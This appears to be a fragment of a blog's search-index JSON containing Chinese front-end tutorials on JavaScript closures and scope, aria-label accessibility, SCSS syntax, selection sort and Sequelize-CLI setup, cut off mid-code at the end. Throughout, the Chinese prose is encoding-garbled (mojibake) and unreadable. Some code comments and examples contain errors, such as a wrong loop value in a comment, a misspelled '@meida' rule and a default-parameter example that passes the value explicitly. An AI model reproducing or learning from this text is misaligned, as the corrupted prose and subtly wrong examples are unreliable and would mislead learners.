ç¯„ä¾‹ä¸€12345678910function test () { // å‡è¨­ buttons.length = 5 const buttons = document.querySelectorAll('.btn') for (var i=0; i&lt;buttons.length; i++) { buttons[i].addEventListener('click', function() { console.log(i) }) }}test() åœ¨é€™å€‹ä¾‹å­ä¸­ï¼ŒæŒ‰ä¸‹æŒ‰éˆ•æ™‚éƒ½æœƒå°å‡º 5ã€‚ å› ç‚ºé€™é‚Šåªæœ‰ä¸€å€‹ä½œç”¨åŸŸï¼štestï¼Œæ¯ä¸€å€‹ callback åŸ·è¡Œçš„æ™‚å€™éƒ½æœƒåˆ° test è£¡é¢æ‰¾ iï¼Œè€Œé€™å€‹æ™‚å€™çš„ i å·²ç¶“æ˜¯è¿´åœˆè·‘å®Œçš„å€¼ï¼Œä¹Ÿå°±æ˜¯ 5ã€‚ ç¯„ä¾‹äºŒ12345678910// å‡è¨­ buttons.length = 5const buttons = document.querySelectorAll('.btn')for (var i=0; i&lt;buttons.length; i++) { buttons[i].addEventListener('click', scope(i))}function scope(num) { return function () { console.log(num) }} ç‚ºä»€éº¼é€™æ¨£å°±å¯ä»¥è¨˜ä½ i çš„å€¼ï¼Ÿå¯ä»¥æƒ³æˆæ˜¯é€™æ¨£å­ï¼š 12345678910111213141516171819202122232425262728293031323334/* ç¬¬ä¸€åœˆ num = 0 ç­‰ callback è¢«åŸ·è¡Œçš„æ™‚å€™ï¼Œ å›ä¾†é€™å€‹ scope è£¡é¢æ‰¾ num num çš„å€¼å°±æ˜¯ 0 */function scope(num) { return function () { console.log(num) }}/* ç¬¬äºŒåœˆ num = 1 ç­‰ callback è¢«åŸ·è¡Œçš„æ™‚å€™ï¼Œ å›ä¾†é€™å€‹ scope è£¡é¢æ‰¾ num num çš„å€¼å°±æ˜¯ 1*/function scope(num) { return function () { console.log(num) }}/* ç¬¬ä¸‰åœˆ num = 2 ç­‰ callback è¢«åŸ·è¡Œçš„æ™‚å€™ï¼Œ å›ä¾†é€™å€‹ scope è£¡é¢æ‰¾ num num çš„å€¼å°±æ˜¯ 2*/function scope(num) { return function () { console.log(num) }}... ä¹Ÿå°±æ˜¯èªªä½ æ¯ä¸€åœˆåŸ·è¡Œ scope çš„æ™‚å€™éƒ½ç”¢ç”Ÿäº†ä¸€å€‹æ–°çš„ä½œç”¨åŸŸï¼Œåœ¨é€™å€‹ä½œç”¨åŸŸè£¡é¢ num çš„å€¼å°±æ˜¯è¿´åœˆ i çš„å€¼ï¼Œæ‰€ä»¥ callback å›åˆ° scope ä½œç”¨åŸŸè£¡é¢æ‰¾è®Šæ•¸çš„æ™‚å€™ï¼Œå°±æœƒæ˜¯ä¸€é–‹å§‹å‚³é€²å»çš„é‚£å€‹å€¼ã€‚ ç¯„ä¾‹ä¸‰1234567// å‡è¨­ buttons.length = 5const buttons = document.querySelectorAll('.btn')for (let i=0; i&lt;buttons.length; i++) { buttons[i].addEventListener('click', function() { console.log(i) })} let çš„ä½œç”¨åŸŸæ˜¯ä»¥ {} ä¾†ç•¶ä½œå–®ä½ï¼Œæ¯åœˆéƒ½æœƒç”¢ç”Ÿä¸€å€‹ {}ï¼Œåƒé€™æ¨£ï¼š 12345678910111213141516171819202122232425262728293031323334353637/* ç¬¬ä¸€åœˆ i = 1 ç­‰ callback è¢«åŸ·è¡Œçš„æ™‚å€™ï¼Œ å›ä¾†é€™å€‹ scope è£¡é¢æ‰¾ i i çš„å€¼å°±æ˜¯ 1*/{ let i=0 function () { console.log(i) }}/* ç¬¬äºŒåœˆ i = 1 ç­‰ callback è¢«åŸ·è¡Œçš„æ™‚å€™ï¼Œ å›ä¾†é€™å€‹ scope è£¡é¢æ‰¾ i i çš„å€¼å°±æ˜¯ 1*/{ let i=1 function () { console.log(i) }}/* ç¬¬ä¸‰åœˆ i = 2 ç­‰ callback è¢«åŸ·è¡Œçš„æ™‚å€™ï¼Œ å›ä¾†é€™å€‹ scope è£¡é¢æ‰¾ i i çš„å€¼å°±æ˜¯ 2*/{ let i=2 function () { console.log(i) }}...","link":"/2022/01/19/scope-difference/"},{"title":"æœ€å®¹æ˜“æéŒ¯çš„ Scope","text":"æ‡¶äººåŒ…ã€‚ ç°¡è¿°1234567891011121314var a = 'global scope';function yoyo () { var a = 'yoyo scope' function haha () { var a = 'haha scope'; mistake() } haha()}yoyo()function mistake () { console.log(a) // global, yoyo, haha ?} ç­”æ¡ˆæ˜¯ globalã€‚ ä½ å¾ˆå®¹æ˜“æœƒä»¥ç‚ºæ˜¯é€™æ¨£ï¼š 1234567891011121314var a = 'global scope';function yoyo () { var a = 'yoyo scope' function haha () { var a = 'haha scope'; // åœ¨é€™é‚Šå‘¼å«çš„æ„Ÿè¦ºæœƒè®“äººä»¥ç‚ºæ˜¯é€™æ¨£ mistake() function mistake () { console.log(a) // hahaï¼Ÿ } } haha()}yoyo() å¯æ˜¯ä¸æ˜¯ï¼Œæˆ‘å€‘æœƒèªª JS çš„ä½œç”¨åŸŸæ˜¯ã€Œéœæ…‹ä½œç”¨åŸŸã€ï¼Œæ˜¯å› ç‚ºä½œç”¨åŸŸåœ¨å®£å‘Šçš„æ™‚å€™å°±å·²ç¶“æ±ºå®šäº†ï¼Œæ‰€ä»¥æ‰èªªæ˜¯ã€Œéœæ…‹çš„ã€ã€‚ è‡³æ–¼ä¸Šé¢é‚£å€‹éŒ¯èª¤çš„ç¤ºç¯„æ˜¯ã€Œå‹•æ…‹ä½œç”¨åŸŸã€ï¼Œä»£è¡¨ä½œç”¨åŸŸæœƒæ ¹æ“šã€Œå‘¼å«ã€çš„åœ°æ–¹è®Šä¾†è®Šå»ã€‚","link":"/2022/03/06/scope-mistake/"},{"title":"è¢å¹•é–±è®€è€…å‹å–„çš„ a æ¨™ç±¤","text":"ç„¡éšœç¤™ä¸€ä¸‹ã€‚ æˆ‘ä¾†ç•¶ä½ çš„å°ç›²çŠ¬å¾ˆå¤šæ™‚å€™æˆ‘å€‘æœƒä½¿ç”¨icon-fontä¾†ç•¶ä½œç¤¾ç¾¤åª’é«”çš„é€£çµåœ–æ¡ˆï¼Œæ‰€ä»¥å¯èƒ½å¾ˆå¸¸è¦‹åˆ°ä»¥ä¸‹é€™æ®µåŸå§‹ç¢¼ï¼š 123&lt;a href=\"#\"&gt; &lt;i class=\"fab fa-facebook-square\"&gt;&lt;/i&gt;&lt;/a&gt; å–®å¾è¦–è¦ºä¸Šä¾†çœ‹æ²’ä»€éº¼å•é¡Œï¼Œä½†ä½¿ç”¨è¢å¹•é–±è®€å™¨çš„ä½¿ç”¨è€…æœƒä¸çŸ¥é“é€™å€‹é€£çµçš„ä½œç”¨ï¼Œ æ‰€ä»¥å»ºè­°å¯ä»¥åŠ ä¸Š aria-label å±¬æ€§ï¼Œä¾†å¹«é€™å€‹é€£çµåŠ ä¸Šä¸€å€‹å…§å®¹ï¼Œåƒé€™å€‹æ¨£å­ï¼š 123&lt;a href=\"#\" aria-label=\"this is our link of facebook\"&gt; &lt;i class=\"fab fa-facebook-square\"&gt;&lt;/i&gt;&lt;/a&gt; é€™æ¨£ç•¶è¢å¹•é–±è®€å™¨åŸ·è¡Œåˆ°é€™é‚Šæ™‚ï¼Œå°±æœƒå”¸å‡ºã€Œthis is our link of facebookã€ã€‚","link":"/2022/01/16/screen-reader-friendly-a/"},{"title":"SCSSéš¨ç­†è¨˜","text":"ç´€éŒ„ä¸€äº› SCSS çš„ç›¸é—œèªæ³• èªæ³•å°è¦½ Variable è®Šæ•¸ Nesting å·¢ç‹€çµæ§‹ &amp; ç„¡ç¸«é¸å–å™¨ @Import åŒ¯å…¥ @mixin æ··åˆ Variable è®Šæ•¸å»ºç«‹è®Šæ•¸çš„æ–¹å¼ï¼š 123456789// colors$primary-white: #fff;$primary-orange: hsl(31, 77%, 52%);$normal-cyan: hsl(184, 100%, 22%);// fonts$primary-font-size: 15px;$primary-font-family: 'Lexend Deca', sans-serif;$primary-font-line-height: 1.5; ç¶²é ä¸­å¾ˆå¸¸ç”¨åˆ°çš„è‰²å½©ã€æ–‡å­—è¨­å®šç­‰ï¼Œéƒ½å¾ˆé©åˆæ‹¿ä¾†å­˜åœ¨è®Šæ•¸ä¸­ã€‚ å¯ä»¥è¨­å®šçš„å€¼ï¼š æ•¸å€¼ï¼šï¼ˆ0) å­—ä¸²ï¼šï¼ˆ'Jim', \"Jim\", Jimï¼‰ é¡è‰²ï¼šï¼ˆ#000ï¼‰ å¸ƒæ—å€¼ï¼šï¼ˆtrue, falseï¼‰ ç©ºå€¼ï¼šï¼ˆnullï¼‰ é™£åˆ—ï¼šï¼ˆ10px 20px 30px, Arail, sans-serifï¼‰ï¼ˆä»¥ç©ºæ ¼æˆ–é€—è™Ÿéš”é–‹ï¼‰ mapsï¼šï¼ˆ(key1 : value1, key2: value2)ï¼‰é¡ä¼¼ç‰©ä»¶ Nesting å·¢ç‹€çµæ§‹å‡è¨­æˆ‘å€‘æœ‰ä¸€æ®µ HTML çš„çµæ§‹å¦‚ä¸‹ï¼š 1234567&lt;div class=\"wrap\"&gt; &lt;div class=\"container\"&gt; &lt;h2 class=\"heading\"&gt;&lt;/div&gt; &lt;img class =\"pic\" src=\"/path\"&gt; &lt;p class=\"txt\"&gt;&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; ä»¥å¾€åœ¨ CSS ä¸­å¯èƒ½å¾—é€™æ¨£å­å¯«ï¼š 12345678910111213.wrap { /* ... */}.wrap .container { /* ... */}.wrap .container .heading { /* ... */}/* ä»¥æ­¤é¡æ¨ */ ä½†å¦‚æœæ˜¯ SCSSï¼š 123456789101112131415.wrap { // ... .container { // ... .heading { // ... } .pic { // ... } .txt { // ... } }} é¡¯ç„¶ SCSS ä¸ç®¡åœ¨ç°¡æ½”é‚„æ˜¯çµæ§‹ä¸Šçœ‹èµ·ä¾†éƒ½å¤§å‹ CSS å§ï¼ä¸éåˆ¥å¿˜äº†ï¼Œç•¶ SCSS è¢«ç·¨è­¯æˆ CSS å¾Œï¼Œå…¶å¯¦å°±å’Œç¬¬ä¸€å€‹é•·çš„ä¸€æ¨¡ä¸€æ¨£å“¦ã€‚ &amp; ç„¡ç¸«é¸å–å™¨æ³¨æ„ï¼šé€™å€‹åç¨±æ˜¯æˆ‘è‡ªå·±ç™¼æ˜çš„ï¼Œç´”ç²¹æ˜¯è¦ºå¾—ã€Œé€£çµé¸å–å™¨ã€é€™å€‹åå­—å¤ªé¥’å£ã€‚ å®ƒçœŸæ­£çš„æ„æ€æ˜¯ï¼š The ampersand (&amp;) is a wonderful little character. Itâ€™s an ancient symbol, a ligature of the Latin â€œEt,â€ that connects words, phrases, and thoughts. æ„æ€æ˜¯èªªï¼Œ&amp;æ˜¯ä¸€å€‹ä¾†è‡ªæ‹‰ä¸æ–‡ä¸­çš„ é€£å­—ç¬¦è™Ÿ (Et)â€ ï¼Œç”¨ä¾†æŠŠæ–‡å­—ã€ç‰‡æ®µã€æ€æƒ³çµ¦é€£æ¥èµ·ä¾†ã€‚ ç¾ä»Šæˆ‘å€‘æœƒç”¨ &amp; ä¾†è¡¨ç¤ºè‹±æ–‡çš„ã€Œand æˆ– as well asã€ï¼Œæˆ–æ˜¯ä¸­æ–‡çš„ã€Œä¸”ã€ï¼Œä½†éƒ½è·Ÿä»–æœ€åŸå§‹çš„æ„æ€å·®ä¸å¤šï¼Œç¸½è€Œè¨€ä¹‹ï¼Œéƒ½æ˜¯ç”¨ä¾†æŠŠ A è·Ÿ B çµ¦é€£åœ¨ä¸€èµ·çš„æ„æ€ åœ¨ SCSS ä¸­ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œè®“æˆ‘å€‘çœ‹å€‹ç¤ºç¯„ï¼š 123456.btn { color: black; &amp;:hover { color: white; }} ç­‰æ–¼ï¼š 123456.btn { color: black;}.btn:hover { color: white;} ä½ æ‡‰è©²æœ‰çœ‹å‡ºä¾†ï¼Œæ­£å¸¸æƒ…æ³ä¸‹.btnè·Ÿ:hoverä¹‹é–“æ‡‰è©²è¦æœ‰ä¸€å€‹ã€Œç©ºæ ¼ï¼ˆç©ºç™½å­—å…ƒï¼‰ã€ï¼Œä½†ç¾åœ¨ç”¨äº† &amp; é€™å€‹ç¬¦è™Ÿå¾Œï¼Œé€™å€‹ç©ºæ ¼å°±æœƒæ¶ˆå¤±äº†ï¼Œé€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼æˆ‘æœƒå«ä»–ç„¡ç¸«çš„åŸå› ã€‚ ç•¶ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨æ­£è¦çš„è§£é‡‹ï¼Œæ„æ€æ˜¯æŠŠ.btnè·Ÿ:hoverçµ¦é€£çµèµ·ä¾†ï¼Œé€™æ¨£ä¹Ÿè¡Œï¼Œçœ‹ä½ å–œæ­¡å“ªå€‹å°±å¥½äº†ã€‚ @Import åŒ¯å…¥ä½ å¯ä»¥ä½¿ç”¨@importä¾†åŒ¯å…¥ä¸€å€‹å¤–éƒ¨é€£çµï¼š 12// google font@import url('https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700&amp;display=swap'); é™¤æ­¤ä¹‹å¤–ï¼Œä½ ä¹Ÿå¯ä»¥åˆ©ç”¨@importä¾†åšä¸€ä»¶å¾ˆæ–¹ä¾¿çš„äº‹æƒ…ã€‚ é¦–å…ˆè°æ˜çš„ä½ çŸ¥é“ï¼ŒæŠŠæª”æ¡ˆåˆ†é–‹ä¾†æ¯”è¼ƒå¥½åšç®¡ç†ï¼Œæ‰€ä»¥ä½ æœ‰ 3 å€‹æª”æ¡ˆï¼Œåˆ†åˆ¥ç‚ºï¼š reset.scss layout.scss page.scss ä½†æ˜¯ä½ ä¹ŸçŸ¥é“ï¼Œ SCSS å¯«å®Œå¾Œé‚„å¾—åšç·¨è­¯é€™ä»¶äº‹ï¼Œæ‰€ä»¥æˆ‘å€‘å¾—ç·¨è­¯ 3 æ¬¡ï¼Œ æ‰€ä»¥ç•¶æª”æ¡ˆè¶Šä¾†è¶Šå¤šçš„æ™‚å€™ï¼Œçµ•å°æœƒè®Šå¾—å¾ˆéº»ç…©ï¼Œæœ‰æ²’æœ‰æ›´å¥½çš„åšæ³•ï¼Ÿ æœ‰ï¼Œå°±æ˜¯ç”¨@importçš„æ–¹å¼ä¾†æ“ä½œã€‚ æˆ‘å€‘åªéœ€è¦åœ¨å»ºç«‹ä¸€å€‹all.scssæª”æ¡ˆï¼Œä¸¦ä¸”æŠŠå…¶ä»–æª”æ¡ˆéƒ½åŠ ä¸Šä¸‹åº•ç·š_ï¼Œåƒé€™æ¨£ï¼š åŠ ä¸‹åº•ç·šæ˜¯ç”¨ä¾†ä»£è¡¨ï¼Œé€™æ˜¯ä¸€å€‹è¢«æ‹¿ä¾†åˆä½µçš„æª”æ¡ˆã€‚ all.scss _reset.scss _layout.scss _page.scss æ¥è‘—åœ¨ all.scss ä¸­å»å¼•å…¥å¦å¤– 3 å€‹æª”æ¡ˆï¼Œåƒé€™æ¨£ï¼š 12345// åœ¨ all.scss å¼•å…¥å¦å¤– 3 å€‹æª”æ¡ˆ// æ­¤è™•è¦å¼•å…¥çš„æª”æ¡ˆä¸éœ€è¦åŠ ä¸Šä¸‹åº•ç·š@import 'reset';@import 'layout';@import 'page'; é€™æ¨£å­ all.scss å°±æœƒæŒ‰ç…§é †åºå»å¼•å…¥é€™äº›æª”æ¡ˆï¼Œè€Œä¹‹å¾Œä½ ä¹Ÿåªéœ€è¦å»ç·¨è­¯ all.scss é€™å€‹æª”æ¡ˆå³å¯ã€‚ @mixin æ··åˆğŸ’¡ è¨»ï¼šä½ ä¹Ÿå¯ä»¥æŠŠå®ƒæƒ³æˆæ˜¯å±±å¯¨ç‰ˆçš„functionï¼Œä»–å¯ä»¥è¨­å®šåƒæ•¸åŠå¸¶å…¥è®Šæ•¸ï¼Œä½†æ²’æœ‰if / forçš„åŠŸèƒ½ã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯æŠŠä¸€ç¾¤å€¼çµ¦é›†åˆèµ·ä¾†ï¼Œæ‰€ä»¥æ‰å«mixinã€‚ èˆ‰å€‹æœ€ç°¡å–®çš„ä¾‹å­ï¼š 12345678910@mixin border-radius { -webkit-border-radius: 10px; -moz-border-radius: 10px; -ms-border-radius: 10px; -o-border-radius: 10px; border-radius: 10px;}.box { @include border-radius;} å¦‚æœç¾åœ¨ä½ æœ‰ 10 å€‹å€å¡Šéƒ½è¦ç”¨åˆ°border-radiusï¼Œä½ æœƒæƒ³å¯« 50 è¡Œé‚„æ˜¯ 5 è¡Œå‘¢ï¼Ÿ è¨­å®šåƒæ•¸ ä¸åŒå€å¡Šçš„border-radiuså€¼å¯èƒ½ä¸ä¸€æ¨£ï¼Œæ‰€ä»¥é€™æ™‚å€™æ”¹æˆç”¨åƒæ•¸ä¾†è¨­å®šï¼Œå°±å¯ä»¥å¸¶ä¾†æ›´å¤§çš„å½ˆæ€§ï¼š 1234567891011@mixin border-radius($radius) { -webkit-border-radius: $radius; -moz-border-radius: $radius; -ms-border-radius: $radius; -o-border-radius: $radius; border-radius: $radius;}.box { // ç¾åœ¨å¯ä»¥è‡ªè¨‚radiusçš„å€¼å›‰ï¼ @include border-radius(10px);} é è¨­åƒæ•¸å€¼ æœ‰æ²’æœ‰èåˆ° ES6 çš„å‘³é“ï¼Ÿ å¦‚æœä½ å¸Œæœ›åƒæ•¸èƒ½æœ‰å€‹é è¨­çš„åˆå§‹å€¼ï¼Œé‚£ä½ å¯ä»¥é€™æ¨£å­å¯«ï¼š 1234567891011121314@mixin border-radius($radius: 10px) { -webkit-border-radius: $radius; -moz-border-radius: $radius; -ms-border-radius: $radius; -o-border-radius: $radius; border-radius: $radius;}.box { // å¦‚æœä¸æŒ‡å®šå€¼ï¼Œå°±æ¡ç”¨é è¨­å€¼ (10px) @include border-radius(10px); // å¦‚æœæŒ‡å®šå€¼ï¼Œå°±å¥—ç”¨è¨­å®šçš„å€¼ (20px) @include border-radius(20px);} çœç•¥éƒ¨åˆ†åƒæ•¸å€¼ èˆ‰å€‹ä¾‹å­ï¼š 1234567891011121314@mixin background( $size: cover, $position-x: center, $position-y: center, $repeat: no-repeat) { background-size: $size; background-position: $position-x $position-y; background-repeat: $repeat;}.box { @include background;} å¦‚æœç¾åœ¨æˆ‘åªæƒ³ä¿®æ”¹$repeatçš„å€¼ï¼Œé‚£åœ¨@includeçš„æ™‚å€™è©²æ€éº¼å¯«å‘¢ï¼Ÿ 123.box { @include background($repeat: repeat);} å¾ˆç°¡å–®ï¼Œåªè¦æŠŠæƒ³è¦ä¿®æ”¹çš„é‚£å€‹åƒæ•¸å«å‡ºä¾†è¨­å®šå³å¯ï¼Œè€Œå…¶ä»–çš„æ²’å‹•åˆ°çš„éƒ¨åˆ†å°±æœƒè‡ªå‹•å¥—ç”¨é è¨­å€¼ã€‚ å¸¶å…¥è®Šæ•¸ å¦‚æœä½ è¦åœ¨@mixinè£¡é¢å¼•ç”¨æŸå€‹è®Šæ•¸ä¹Ÿæ˜¯ OK çš„ã€‚ 1234567891011$value: 10px;@mixin border-radius { -webkit-border-radius: $value; -moz-border-radius: $value; -ms-border-radius: $value; -o-border-radius: $value; border-radius: $value;}.box { @include border-radius;} åˆ©ç”¨ @content åŠ å…¥é¡å¤–çš„å…§å®¹ å¦‚æœæœ‰äº›æ±è¥¿æ˜¯é¡å¤–æ·»åŠ çš„ï¼Œä¸æƒ³å¯«æ­»åœ¨@mixinä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨@contentï¼Œå°±å¯ä»¥è®“ä½ åœ¨ä½¿ç”¨@mixinçš„æ™‚å€™èƒ½å¤ é¡å¤–å¯«å…¥ä¸€äº›è‡ªå·±æƒ³å¯«çš„æ±è¥¿ã€‚ é€™è£¡æ‹¿media queryä¾†åšä¸€å€‹ç¤ºç¯„ï¼š 123456789101112131415@mixin mediaQuery-pc { // æ¡Œæ©Ÿæ¿çš„ media @meida screen and (min-width: 760px) { // å…§å®¹è‡ªå·±å¡« @content; }}.box { padding: 10px; @include mediaQuery-pc { padding: 20px; }} é€™æ¨£å­å¯«çš„è©±ä½ çš„media queryå°±æœƒä¹¾æ·¨å¾ˆå¤šã€‚ é€™è£¡æä¾›ä¸€å€‹ç°¡å–®çš„ RWD ç¤ºç¯„ï¼š See the Pen by jim (@jubeatt) on CodePen. ğŸ’¡ è¨»ï¼šæ–¹å¡Šçš„é¡è‰²æœƒéš¨è‘—å¯¬åº¦åšæ”¹è®Šã€‚ åƒè€ƒè³‡æ–™sparkbox30 å¤©æŒæ¡ Sass èªæ³• - (5)åˆ©ç”¨ Sassã€Œ@importã€é€²è¡Œ CSS æª”æ¡ˆæ¨¡çµ„åˆ‡å‰²30 å¤©æŒæ¡ Sass èªæ³• - (18)è¦åŠƒä½ çš„ Sass çµæ§‹SASS æ•™å­¸ ï¼‹ SCSSï¼šCSS å†é€²åŒ–ï¼ŒæŒæ¡èªæ³•æ”»ç•¥ï¼SCSS 15 åˆ†é˜å…¥é–€","link":"/2021/07/28/scss-note/"},{"title":"é¸æ“‡æ’åºæ³•ï¼ˆSelection sortï¼‰","text":"æœ€ç›´è¦ºçš„æ’åºæ³•ã€‚ æ¦‚å¿µæ¯æ¬¡éƒ½å¾æ•¸åˆ—ä¸­æ‰¾å‡ºæœ€å°çš„ï¼Œç„¶å¾Œç§»åˆ°æœ€å·¦é‚Šã€‚ æµç¨‹åœ–ï¼š æ­¥é©Ÿ123456repeeat (numOfElement - 1) time set the first unsorted element as the minimum for each of the unsorted elements if element &lt; currentMinimum set element as new minumum swap minimum with first unsorted position 12345678éæ­·æ‰€æœ‰æ•¸å­—ï¼ˆè¿´åœˆï¼‰ æŠŠç¬¬ä¸€å€‹æ•¸å­—ç•¶ä½œæœ€å°å€¼ éæ­·å¾Œé¢çš„æœªæ’åºæ•¸å­—ï¼ˆè¿´åœˆï¼‰ å¦‚æœæ•¸å­— &lt; ç›®å‰çš„æœ€å°å€¼ æ›´æ–°æœ€å°å€¼æˆé€™å€‹æ•¸å­— è¿´åœˆçµæŸ æŠŠç¬¬ä¸€å€‹æ•¸å­—è·Ÿæœ€å°å€¼äº¤æ›ä½ç½®è¿´åœˆçµæŸ å¯¦ä½œ123456789101112131415161718192021222324252627282930313233343536373839404142function selectionSort(arr) { // éæ­·æ‰€æœ‰æ•¸å­— for(let i=0; i&lt;arr.length; i++) { // æŠŠç¬¬ä¸€å€‹æ•¸å­—ç•¶ä½œæœ€å°å€¼ let minumum = arr[i] /* å„²å­˜æœ€å°å€¼çš„ä½ç½®ï¼š æ³¨æ„å¦‚æœå¯«æˆ null æœƒæœ‰å•é¡Œï¼Œ å› ç‚ºæœ‰å¯èƒ½ç¬¬ä¸€å€‹æ•¸å­—å°±æ˜¯æœ€å°å€¼ï¼Œ indexOfMinumum å°±æœƒä¸æœƒè¢«æ›´æ–°ï¼Œä¿ç•™ null å€¼ é€™æ¨£æœƒå°è‡´æœ€å¾Œäº¤æ›æ™‚å‡ºéŒ¯ï¼ˆunSotredNumbers[null]ï¼‰ æ‰€ä»¥æ­£ç¢ºçš„ä½œæ³•æ˜¯æŠŠæœ€å°å€¼è¨­ç‚ºç¬¬ä¸€å€‹æ•¸çš„ä½ç½®ï¼Œ ç•¶ç¬¬ä¸€å€‹æ•¸å°±æ˜¯æœ€å°å€¼æ™‚ï¼Œä¹Ÿåªæ˜¯æŠŠè‡ªå·±è·Ÿè‡ªå·±äº¤æ›ä½ç½®è€Œå·² */ let indexOfMinumum = i // éæ­·å¾Œé¢æœªæ’åºçš„æ•¸å­— for (let j=i+1; j&lt;arr.length; j++) { // å¦‚æœæ•¸å­— &lt; ç›®å‰æœ€å°å€¼ if (arr[j] &lt; minumum) { // æ›´æ–°æœ€å°å€¼ minumum = arr[j] // æ›´æ–°æœ€å°å€¼ä½ç½® indexOfMinumum = j } } /* äº¤æ›ä½ç½®ï¼š 1. å„²å­˜ç¬¬ä¸€å€‹æ•¸å­— 2. æŠŠç¬¬ä¸€å€‹æ•¸è¨­æˆæœ€å°å€¼ 3. æŠŠæœ€å°å€¼è¨­æˆç¬¬ä¸€å€‹æ•¸å­— */ let temp = arr[i] arr[i] = minumum arr[indexOfMinumum] = temp } // æ’åºå¥½çš„æ•¸å­— return arr}const unSotredNumbers = [3, 4, 28, 47, 16, 15, 40 ,5, 7, 12, 40, 8, 39, 50, 32, 87]console.log(selectionSort(unSotredNumbers))// [3, 4, 5, 7, 8, 12, 15, 16, 28, 32, 39, 40, 40, 47, 50, 87] é—œæ–¼ null çš„ bug å¯ä»¥åƒè€ƒé€™è£¡ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[1 ,2 ,3] length:3åˆå§‹åŒ–è¨­å®ši=0minumum: 1indexOfMinumum: nullæ‰¾å‡ºæœ€å°å€¼j=1Not found äº¤æ›æ•¸å­—let temp = unSotredNumbers[i] =&gt; 1unSotredNumbers[i] = minumum =&gt; 1 = 1unSotredNumbers[null] = temp =&gt; unSotredNumbers.null = 1åˆå§‹åŒ–è¨­å®ši=1minumum: 2indexOfMinumum: nullæ‰¾å‡ºæœ€å°å€¼j=2Not found äº¤æ›æ•¸å­—let temp = unSotredNumbers[i] =&gt; 2unSotredNumbers[i] = minumum =&gt; 2 = 2unSotredNumbers[null] = temp =&gt; unSotredNumbers.null = 2åˆå§‹åŒ–è¨­å®ši=2minumum: 3indexOfMinumum: nullæ‰¾å‡ºæœ€å°å€¼j=3Not found äº¤æ›æ•¸å­—let temp = unSotredNumbers[i] =&gt; 3unSotredNumbers[i] = minumum =&gt; 3 = 3unSotredNumbers[null] = temp =&gt; unSotredNumbers.null = 3æœ€å¾Œçµæœ[1, 2 ,3, null: 3]","link":"/2022/01/17/selection-sort/"},{"title":"Sequelize-CLI åŸºæœ¬ä½¿ç”¨","text":"å¯«èµ·ä¾†æ‰ä¸æœƒå¿˜ã€‚ æ‡¶äººåŒ…ç¬¬ä¸€æ­¥ç•¶ç„¶æ˜¯å…ˆå®‰è£èµ·ä¾†ï¼š 1npm install --save-dev sequelize-cli æ¥ä¸‹ä¾†çš„æ­¥é©Ÿï¼š åˆå§‹åŒ– npx sequelize-cli init ç”¢ç”Ÿ model model:generate åŸ·è¡Œ migration db:migate åˆå§‹åŒ–ä½¿ç”¨ npx sequelize-cli init ä¾†åˆå§‹åŒ– ORMï¼Œä¸éå…¶å¯¦ä¹Ÿèƒ½ node_modules/.bin/sequelize initï¼Œé€Ÿåº¦ä¸Šå¯èƒ½æœƒå¿«ä¸€é»ã€‚ ç¸½ä¹‹é€™ä¸€æ­¥æœƒç”¢ç”Ÿå¹¾å€‹è³‡æ–™å¤¾ï¼š 12345678â”œâ”€â”€â”€configâ”‚ config.json é€£åˆ°è³‡æ–™åº«çš„è¨­å®šæª”â”‚â”œâ”€â”€â”€migrations ç®¡ç†è³‡æ–™åº«çš„ç‹€æ…‹ï¼ˆæ–°å»º or åˆªé™¤ï¼‰ â”œâ”€â”€â”€modelsâ”‚ index.js ç”¨ä¾†è‡ªå‹•ç”¢ç”Ÿ modelâ”‚â””â”€â”€â”€seeders ç”¨ä¾†æ”¾ç¨®å­æª”æ¡ˆ é€™é‚Šæœ€é‡è¦çš„æ˜¯å…ˆå» config.json æŠŠè³‡æ–™åº«é€£ç·šçµ¦è¨­å®šå¥½ï¼Œæ¥è‘—å°±èƒ½é€²åˆ°ä¸‹ä¸€æ­¥äº†ã€‚ è‡³æ–¼ migrations çš„éƒ¨åˆ†åšå€‹è§£é‡‹ï¼Œå¯ä»¥æŠŠå®ƒæƒ³æˆæ˜¯ã€Œç”¨ä¾†æ”¹è®Šè³‡æ–™åº«ç‹€æ…‹ã€çš„æ±è¥¿ï¼Œè£¡é¢æœƒæœ‰å…©å€‹ functionï¼šup å’Œ downã€‚ up çš„ä½œç”¨å°±æ˜¯ã€Œç•¶è¦é€²å…¥ä¸‹ä¸€å€‹ç‹€æ…‹æ™‚ï¼Œcreate ä¸€å€‹æ–°çš„ tableã€ï¼Œè€Œ down å‰‡æ˜¯ã€Œç•¶è¦è¿”å›åˆ°å‰ä¸€å€‹ç‹€æ…‹æ™‚ï¼Œdrop æ‰åŸæœ¬çš„ tableã€‚ æ‰€ä»¥ï¼š é€²å…¥ä¸‹å€‹ç‹€æ…‹ï¼šdb:migrate è¿”å›ä¸Šå€‹ç‹€æ…‹ï¼šdb:migrate:undo å»ºç«‹ Modelå»ºç«‹ Model çš„æŒ‡ä»¤ï¼šmodel:generate name ä»£è¡¨ Model åç¨± attribute ä»£è¡¨çµæ§‹çš„è¨­å®š 1npx sequelize-cli model:generate --name User --attributes firstName:string,lastName:string,email:string å…¶å¯¦å°±è·Ÿé€™å€‹ä¸€æ¨£ï¼Œåªæ˜¯æ”¹æˆç”¨ CLI ä¾†è™•ç†è€Œå·²ï¼š 1234567891011// å®šç¾©ä¸€å€‹ User çš„ tableconst User = sequelize.define('User', { // è¨­å®šæ¬„ä½è³‡è¨Š firstName: { type: DataTypes.STRING, allowNull: false }, lastName: { type: DataTypes.STRING }}) åŸ·è¡Œå®Œå¾Œå°±æœƒç”¢ç”Ÿä¸€å€‹æ–°çš„ Model å’Œ Migrationï¼š 12345â”œâ”€â”€â”€migrationsâ”‚ 20220325094327-create-user.js // æ–°å¢çš„æª”æ¡ˆâ”œâ”€â”€â”€modelsâ”‚ index.js â”‚ user.js æ–°ç”¢ç”Ÿçš„ model æ¥è‘—å¯ä»¥æ³¨æ„ä¸€ä¸‹ Model çš„éƒ¨åˆ†ï¼š 123456789101112131415161718192021'use strict';const { Model} = require('sequelize');module.exports = (sequelize, DataTypes) =&gt; { class User extends Model { static associate(models) { // è¦é—œè¯çš„ table å¯«åœ¨é€™è£¡ } } User.init({ // æ 